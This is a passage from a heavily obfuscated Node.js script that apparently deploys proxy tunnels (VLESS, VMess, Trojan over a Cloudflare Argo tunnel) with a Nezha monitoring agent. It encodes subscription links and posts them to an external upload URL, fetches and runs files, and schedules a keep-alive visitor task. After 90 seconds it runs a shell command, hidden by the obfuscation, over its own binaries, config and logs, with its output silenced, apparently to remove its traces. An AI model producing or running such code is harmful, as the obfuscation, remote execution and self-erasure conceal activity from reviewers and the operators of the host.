_0x4f9043=_0xad24,_0x50b46a={'v':'2','ps':''+_0x455804,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4f9043(_0x204be3._0x25048f),'net':'ws','type':_0x4f9043(0x18d),'host':_0x117065,'path':_0x4f9043(_0x204be3._0x5445ea),'tls':_0x4f9043(_0x204be3._0x12425e),'sni':_0x117065,'alpn':'','fp':'firefox'},_0xb207aa=_0x4f9043(_0x204be3._0x485f52)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x117065+_0x4f9043(_0x204be3._0x5e97f2)+_0x117065+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x455804+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x4f9043(_0x204be3._0x2f8bb5)](_0x50b46a))[_0x4f9043(0x195)]('base64')+_0x4f9043(_0x204be3._0xc563ca)+UUID+'@'+CFIP+':'+CFPORT+_0x4f9043(0x183)+_0x117065+'&fp=firefox&type=ws&host='+_0x117065+_0x4f9043(0x1b6)+_0x455804+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0xb207aa)[_0x4f9043(_0x204be3._0x2a656f)](_0x4f9043(0x1ad))),fs[_0x4f9043(0x137)](subPath,Buffer['from'](_0xb207aa)['toString']('base64')),console[_0x4f9043(_0x204be3._0x4c1bfb)](FILE_PATH+_0x4f9043(_0x204be3._0x4137b3)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xdb7bda,_0x4371ae)=>{const _0xfc60cb=_0x4f9043,_0x19fff4=Buffer[_0xfc60cb(0x14b)](_0xb207aa)[_0xfc60cb(_0x4ca997._0x5bdeff)](_0xfc60cb(_0x4ca997._0x543e42));_0x4371ae[_0xfc60cb(0x14e)](_0xfc60cb(_0x4ca997._0x1fc131),'text/plain;\x20charset=utf-8'),_0x4371ae[_0xfc60cb(0x149)](_0x19fff4);}),_0x25a694(_0xb207aa);},0x7d0);});}}async function uploadNodes(){const _0x299930={_0x6d1ce1:0x1ec,_0x1b2428:0x146,_0x2dd424:0x1ed,_0x5ec0b4:0x139},_0x48c1fe=_0x303e6f;if(UPLOAD_URL&&PROJECT_URL){const _0x5095f7=PROJECT_URL+'/'+SUB_PATH,_0x3285ba={'subscription':[_0x5095f7]};try{const _0xe20036=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x3285ba,{'headers':{'Content-Type':_0x48c1fe(_0x299930._0x6d1ce1)}});return _0xe20036&&_0xe20036[_0x48c1fe(_0x299930._0x1b2428)]===0xc8?(console['log'](_0x48c1fe(_0x299930._0x2dd424)),_0xe20036):null;}catch(_0x421b3d){if(_0x421b3d[_0x48c1fe(0x1ee)]){if(_0x421b3d['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x48c1fe(0x1ba)](listPath))return;const _0x47984f=fs[_0x48c1fe(_0x299930._0x5ec0b4)](listPath,'utf-8'),_0xce165c=_0x47984f[_0x48c1fe(0x184)]('\x0a')[_0x48c1fe(0x1d7)](_0x359eb3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x48c1fe(0x174)](_0x359eb3));if(_0xce165c[_0x48c1fe(0x17d)]===0x0)return;const _0x2c0dac=JSON['stringify']({'nodes':_0xce165c});try{const _0x3166d9=await axios['post'](UPLOAD_URL+_0x48c1fe(0x1e8),_0x2c0dac,{'headers':{'Content-Type':'application/json'}});return _0x3166d9&&_0x3166d9[_0x48c1fe(_0x299930._0x1b2428)]===0xc8?(console[_0x48c1fe(0x1aa)]('Nodes\x20uploaded\x20successfully'),_0x3166d9):null;}catch(_0x1671eb){return null;}}else return;}}function cleanFiles(){const _0x513513={_0x1cda42:0x1b9,_0x328182:0x1a3,_0x2271d9:0x1c7,_0x2de4a6:0x171,_0x57d9be:0x1d2},_0x50c3a4={_0x2360f0:0x1aa,_0x433165:0x15a};setTimeout(()=>{const _0xc1333={_0x116846:0x1c9},_0x1c41b5=_0xad24,_0x4fb469=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4fb469[_0x1c41b5(0x189)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4fb469['push'](phpPath);process[_0x1c41b5(_0x513513._0x1cda42)]===_0x1c41b5(_0x513513._0x328182)?exec(_0x1c41b5(_0x513513._0x2271d9)+_0x4fb469['join']('\x20')+_0x1c41b5(_0x513513._0x2de4a6),_0x2cff8e=>{const _0x34ec00=_0x1c41b5;console[_0x34ec00(_0xc1333._0x116846)](),console[_0x34ec00(0x1aa)](_0x34ec00(0x19e)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1c41b5(0x1a4)+_0x4fb469[_0x1c41b5(_0x513513._0x57d9be)]('\x20')+'\x20>/dev/null\x202>&1',_0x2a6e87=>{const _0x5c156f=_0x1c41b5;console['clear'](),console[_0x5c156f(_0x50c3a4._0x2360f0)](_0x5c156f(0x19e)),console[_0x5c156f(_0x50c3a4._0x2360f0)](_0x5c156f(_0x50c3a4._0x433165));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x56d36f={_0x2c0b75:0x1d1,_0x48b0c9:0x18b,_0x243d73:0x16f},_0x3621eb=_0x303e6f;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3621eb(_0x56d36f._0x2c0b75));return;}try{const _0x13eb59=await axios[_0x3621eb(_0x56d36f._0x48b0c9)](_0x3621eb(0x15c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3621eb(0x1ec)}});return console[_0x3621eb(0x1aa)](_0x3621eb(0x176)),_0x13eb59;}catch(_0x280c56){return console[_0x3621eb(_0x56d36f._0x243d73)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x280c56[_0x3621eb(0x1e4)]),null;}}async function startserver(){const _0x456fce={_0x3b38ed:0x16f,_0x5991cf:0x1cd},_0x20a28d=_0x303e6f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2a2e92){console[_0x20a28d(_0x456fce._0x3b38ed)](_0x20a28d(_0x456fce._0x5991cf),_0x2a2e92);}}startserver()[_0x303e6f(0x163)](_0x54b840=>{const _0x5f5d0d=_0x303e6f;console[_0x5f5d0d(0x16f)](_0x5f5d0d(0x17b),_0x54b840);}),app[_0x303e6f(0x17c)](PORT,()=>console[_0x303e6f(0x1aa)](_0x303e6f(0x1a2)+PORT+'!'));
